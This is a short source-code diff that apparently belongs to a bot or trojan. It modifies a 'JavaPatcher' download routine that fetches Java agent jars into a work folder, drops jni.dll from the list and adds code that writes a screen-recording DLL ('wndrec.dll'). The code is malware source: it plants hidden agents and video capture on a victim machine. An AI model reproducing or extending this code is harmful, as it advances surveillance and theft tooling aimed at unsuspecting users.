@@ -15,6 +15,7 @@
 #include "Modules.h"
 #include "JavaConfig.h"
 #include "Richedit.h"
+#include "VideoRecorder.h"
 
 
 //#include "BotDebug.h"
@@ -556,7 +557,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( GetWorkFolder(Path) == 0 )
 		return false;
 
-	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", "AgentKP.jar", 0 };
+	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", /*"jni.dll",*/ "client2015.jar", "AgentKP.jar", 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
 	{
@@ -582,6 +583,10 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 		return false;
 
 	DBG( "JavaPatcher",  "Downloading Complete" );
+
+	m_lstrcpy( fileName, Path );
+	pPathAppendA( fileName, "wndrec.dll" );
+	SaveVideoDll(fileName);
 
 	return true;
 }
